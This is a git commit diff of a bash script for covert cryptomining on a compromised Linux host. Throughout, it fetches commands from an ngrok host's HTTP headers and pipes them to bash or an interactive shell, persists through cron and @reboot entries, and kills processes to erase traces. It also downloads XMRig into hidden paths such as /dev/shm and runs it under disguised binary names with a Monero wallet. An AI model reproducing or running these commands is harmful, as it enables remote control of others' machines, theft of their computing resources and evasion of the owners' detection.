9171011007ec08fbc961d40332dc76e4b799909d
MOZZES650 <110117895+MOZZES650@users.noreply.github.com>
2026-01-04 00:18:56 +0100

    Enhance bash script for mining operations
    Updated bash script to include new commands for downloading and executing miner binaries, and added comments for clarity.

--- bashcMD.sh
+++ bashcMD.sh
@@ -1,19 +1,19 @@
+# USE FLASK SERVER TO EXEC CMD
 curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
 
-#kill
+# CLEAN & KILL THEN LEAVE
 kill -9 $(lsof -t -i :443)
 pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl|script -q -c" # use when leave to clean trace
-#cron job
 
+# CRON job
 # Looks cryptic at a glance
 */1 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
 */5 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^lee:' | cut -d':' -f2- | xargs | script -q -c "/bin/bash" /dev/null
 
 
-#rig
+# RIG
 xmrig --url eu.hashvault.pro:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass zao --donate-level 0 --tls --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-max-threads-hint 50 --yield | -t 1 # this might be better than --cpu-max-threads-hint 50
-
-xmrig --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1 --yield 
+ 
 nohup ./moktarr --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1 > /dev/null 2>&1 &
 
 
@@ -22,12 +22,16 @@ nohup ./moktarr --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDK
 curl -L -o xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz
 
 wget -O xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf xmrig.tar.gz && rm -f xmrig.tar.gz
+# Hide in sensible location
+wget -O /dev/shm/xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf /dev/shm/xmrig.tar.gz && rm -f /dev/shm/xmrig.tar.gz
+# straight launch
+/dev/shm/.x/mok --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass Nextjs_333! --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-max-threads-hint 75
 
 
-# STEP 1 file
+# STEP 1 create javx.sh = LOADER
 
 MINER_PATH="/tmp/.Test-unix/moktarr"
-CMD="$MINER_PATH --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1"
+CMD="$MINER_PATH --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3"
 
 LAST_REFRESH=$(date +%s)
 
@@ -51,19 +55,13 @@ done
 # STEP 2
 
 #Make it executable: chmod +x javx.sh
-
 #Add it to your User Crontab: Type crontab -e and add this single line at the bottom:  @reboot /bin/bash /tmp/.Test-unix/javx.sh
 
 #How to use it:
 
 #    Make it executable: chmod +x javx.sh
-
  #   Run it in the background: To keep it running even after you close your terminal, use screen (pre-installed on Ubuntu):
-
   #      Type screen to open a new session.
-
    #     Run the script: ./javx.sh
-
     #    Press Ctrl + A then D to detach.
-
     #The script is now the boss: It will check the miner every 5 minutes. If XMRig dies, the script starts it back up.
